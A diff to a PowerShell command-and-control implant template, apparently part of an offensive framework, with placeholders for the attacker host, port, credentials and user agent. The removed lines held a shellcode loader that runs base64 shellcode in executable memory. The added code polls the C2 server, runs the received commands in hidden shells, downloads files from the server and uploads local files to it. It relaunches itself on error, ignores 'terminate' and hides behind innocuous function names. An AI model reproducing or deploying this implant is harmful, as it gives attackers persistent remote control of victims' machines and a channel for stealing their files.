@@ -1,113 +1,238 @@
-$C2_URL = 'http://{lhost}:{lport}'
-$CLIENT_ID = '{line}'
+$C2_URL = "http://{lhost}:{lport}"
+$CLIENT_ID = "{line}"
+$USERNAME = "{username}"
+$PASSWORD = "{password}"
+$SLEEP = {sleep}
+$MALEABLE = "{maleable}"
+$USER_AGENT = "{useragent}"
+$MAX_RETRIES = 5
+$RETRY_DELAY = 5
+
+function HelloWorld {
+    if ($Error.Count -gt 0) {
+        Write-Output "[RECOVER] Recuperándose de panic: $Error[0]"
+                Start-Process -FilePath $MyInvocation.MyCommand.Path -ArgumentList $MyInvocation.UnboundArguments -NoNewWindow -Wait
+        exit
+    }
+}
+
+function Send-Gift {
+    param (
+        [string]$url,
+        [string]$method,
+        [string]$body,
+        [string]$filePath
+    )
+
+    $lastErr = $null
+    for ($eltiempo = 0; $eltiempo -lt $MAX_RETRIES; $eltiempo++) {
+        if ($eltiempo -gt 0) {
+            Start-Sleep -Seconds $RETRY_DELAY
+        }
+
+        try {
+            $resp = Send-Request -url $url -method $method -body $body -filePath $filePath
+            return $resp
+        } catch {
+            $lastErr = $_.Exception.Message
+            Write-Output "[RETRY] Intento $($eltiempo + 1) de $MAX_RETRIES fallido: $lastErr"
+        }
+    }
+    throw $lastErr
+}
 
 function Send-Request {
     param (
         [string]$url,
-        [string]$method = 'GET',
-        [string]$body = '',
-        [string]$username = '{username}',
-        [string]$password = '{password}'
+        [string]$method,
+        [string]$body,
+        [string]$filePath
     )
 
-    $headers = @{
-        'Authorization' = 'Basic ' + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$username`:$password"))
-    }
-    
-    if ($method -eq 'POST') {
-        $headers['Content-Type'] = 'application/json'
+    trap { HelloWorld }
+
+    $client = New-Object System.Net.Http.HttpClient
+    $client.Timeout = New-TimeSpan -Seconds 60
+    $client.DefaultRequestHeaders.Authorization = New-Object System.Net.Http.Headers.AuthenticationHeaderValue "Basic", [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("${USERNAME}:${PASSWORD}"))
+    $client.DefaultRequestHeaders.UserAgent.ParseAdd($USER_AGENT)
+
+    if ($filePath -ne "") {
+        $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+        $byteArrayContent = New-Object System.Net.Http.ByteArrayContent -ArgumentList @(,$fileContent)
+        $content = New-Object System.Net.Http.MultipartFormDataContent
+        $content.Add($byteArrayContent, "file", [System.IO.Path]::GetFileName($filePath))
+        $response = $client.PostAsync($url, $content).Result
+    } else {
+        $content = [System.Net.Http.StringContent]::new($body, [System.Text.Encoding]::UTF8, "application/json")
+        $requestMessage = [System.Net.Http.HttpRequestMessage]::new($method, $url)
+        $requestMessage.Content = $content
+        $response = $client.SendAsync($requestMessage).Result
     }
 
-    try {
-        if ($method -eq 'GET') {
-            $response = Invoke-RestMethod -Uri $url -Method Get -Headers $headers
-        } elseif ($method -eq 'POST') {
-            $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
-        } else {
-            throw "Unsupported HTTP method: $method"
-        }
-        return $response
-    } catch {
-        Write-Error "Error in Send-Request: $_"
-        return $null
-    }
+    return $response
 }
 
-function Escn {
+function Ex-Gift {
     param (
-        [string]$shellcode
+        [string[]]$sc,
+        [string]$command
     )
 
-    $Win32 = @"
-    using System;
-    using System.Runtime.InteropServices;
-
-    public class Win32 {
-        [DllImport("kernel32")]
-        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-        
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
-        
-        [DllImport("kernel32")]
-        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-        
-        [DllImport("kernel32")]
-        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-    }
-"@
-
-    Add-Type -TypeDefinition $Win32
-
-    $shellcodeBytes = [System.Convert]::FromBase64String($shellcode)
-    
-    $size = $shellcodeBytes.Length
-    
-    $allocationType = 0x3000  # MEM_COMMIT | MEM_RESERVE
-    $protectionType = 0x40    # PAGE_EXECUTE_READWRITE
-
-    $pointer = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, $allocationType, $protectionType)
-    
-    [System.Runtime.InteropServices.Marshal]::Copy($shellcodeBytes, 0, $pointer, $size)
-
-    $thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $pointer, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-    
-    # Usar 0xFFFFFFFF como valor hexadecimal para representar -1
-    $result = [Win32]::WaitForSingleObject($thread, 0xFFFFFFFF)
-
-    return $result
-}
-
-while ($true) {
-    try {
-        $command = Send-Request "$C2_URL/command/$CLIENT_ID"
-
-        if ($command) {
-            if ($command -match 'terminate') {
-                break
-            } elseif ($command -match '^sc:') {
-                $sc = $command -replace '^sc:', ''
-                Escn $sc
-            } elseif ($command -match '^download:') {
-                $file_path = $command -replace '^download:', ''
-                $file_url = "$C2_URL/download/$file_path"
-                $file_name = [System.IO.Path]::GetFileName($file_path)
-                Invoke-RestMethod -Uri $file_url -Method Get -Headers $headers -OutFile $file_name
-                if (Test-Path $file_name) {
-                    Write-Output "[INFO] File downloaded: $file_name"
-                } else {
-                    Write-Error "[ERROR] File download failed: $file_name"
-                }
-            } else {
-                $output = cmd.exe /c $command 2>&1
-                $json_data = @{ output = $output, client = 'Windows' } | ConvertTo-Json -Depth 10
-                Send-Request "$C2_URL/command/$CLIENT_ID" -method 'POST' -body $json_data
-            }
+    $output = $null
+    $lastErr = $null
+    for ($eltiempo = 0; $eltiempo -lt $MAX_RETRIES; $eltiempo++) {
+        if ($eltiempo -gt 0) {
+            Start-Sleep -Seconds $RETRY_DELAY
         }
 
-        Start-Sleep -Seconds 5
-    } catch {
-        Write-Error "Error in main loop: $_"
-        break
+        try {
+            $output = Bubies -sc $sc -command $command
+            return $output
+        } catch {
+            $lastErr = $_.Exception.Message
+            Write-Output "[RETRY] Intento de ejecución $($eltiempo + 1) de $MAX_RETRIES fallido: $lastErr"
+        }
+    }
+    throw $lastErr
+}
+
+function Bubies {
+    param (
+        [string[]]$sc,
+        [string]$command
+    )
+
+    trap { HelloWorld }
+
+    $process = New-Object System.Diagnostics.Process
+    $process.StartInfo.FileName = $sc[0]
+    $process.StartInfo.Arguments = "$($sc[1]) $command"
+    $process.StartInfo.RedirectStandardOutput = $true
+    $process.StartInfo.RedirectStandardError = $true
+    $process.StartInfo.UseShellExecute = $false
+    $process.StartInfo.CreateNoWindow = $true
+    $process.Start() | Out-Null
+    $output = $process.StandardOutput.ReadToEnd()
+    $error = $process.StandardError.ReadToEnd()
+    $process.WaitForExit()
+
+    if ($process.ExitCode -ne 0) {
+        throw "$error`n$output"
+    }
+
+    return $output
+}
+
+function Get-Price {
+    trap { HelloWorld }
+
+    if (Test-Path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe") {
+        return @("powershell.exe", "-Command")
+    } elseif (Test-Path "C:\Windows\System32\cmd.exe") {
+        return @("cmd.exe", "/C")
+    } else {
+        throw "No se encontró un shell compatible"
     }
 }
+
+function Main {
+    trap { HelloWorld }
+
+    $sc = Get-Price
+
+    while ($true) {
+        try {
+            $ctx = New-Object System.Threading.CancellationTokenSource(New-TimeSpan -Seconds 180)
+            $resp = Send-Gift -url "$C2_URL$MALEABLE$CLIENT_ID" -method "GET" -body "" -filePath ""
+            if ($resp -eq $null -or $resp.Content -eq $null) {
+                Write-Output "[ERROR] Respuesta vacía"
+                Start-Sleep -Seconds $SLEEP
+                continue
+            }
+
+            $command = [System.Text.Encoding]::UTF8.GetString($resp.Content.ReadAsByteArrayAsync().Result)
+
+            switch -Wildcard ($command) {
+                "terminate" {
+                    Write-Output "[INFO] Comando terminate recibido pero continuando operación"
+                }
+                "download:*" {
+                    Handle-Download -command $command
+                }
+                "upload:*" {
+                    Handle-Upload -command $command
+                }
+                default {
+                    Hands -command $command -sc $sc
+                }
+            }
+        } catch {
+            Write-Output "[ERROR] Error en request principal: $_"
+            Start-Sleep -Seconds $SLEEP
+        }
+
+        Start-Sleep -Seconds $SLEEP
+    }
+}
+
+function Handle-Download {
+    param (
+        [string]$command
+    )
+
+    trap { HelloWorld }
+
+    $filePath = $command -replace "download:", ""
+    $fileURL = "$C2_URL$MALEABLE/download/$filePath"
+
+    $resp = Send-Gift -url $fileURL -method "GET" -body "" -filePath ""
+    if ($resp -eq $null -or $resp.Content -eq $null) {
+        Write-Output "[ERROR] Respuesta de descarga vacía"
+        return
+    }
+
+    $fileData = $resp.Content.ReadAsByteArrayAsync().Result
+    [System.IO.File]::WriteAllBytes([System.IO.Path]::GetFileName($filePath), $fileData)
+    Write-Output "[INFO] Archivo descargado: $filePath"
+}
+
+function Handle-Upload {
+    param (
+        [string]$command
+    )
+
+    trap { HelloWorld }
+
+    $filePath = $command -replace "upload:", ""
+    $resp = Send-Gift -url "$C2_URL$MALEABLE/upload" -method "POST" -body "" -filePath $filePath
+    if ($resp -ne $null) {
+        if ($resp.StatusCode -eq [System.Net.HttpStatusCode]::OK) {
+            Write-Output "[INFO] Archivo subido: $filePath"
+        } else {
+            Write-Output "[ERROR] Fallo en subida: $filePath (Status: $($resp.StatusCode))"
+        }
+    }
+}
+
+function Hands {
+    param (
+        [string]$command,
+        [string[]]$sc
+    )
+
+    trap { HelloWorld }
+
+    $output = Ex-Gift -sc $sc -command $command
+    $jsonData = @{
+        output = $output
+        client = $env:OS
+        command = $command
+    } | ConvertTo-Json
+
+    $resp = Send-Gift -url "$C2_URL$MALEABLE$CLIENT_ID" -method "POST" -body $jsonData -filePath ""
+    if ($resp -ne $null -and $resp.Content -ne $null) {
+        $resp.Content.Dispose()
+    }
+}
+
+Main
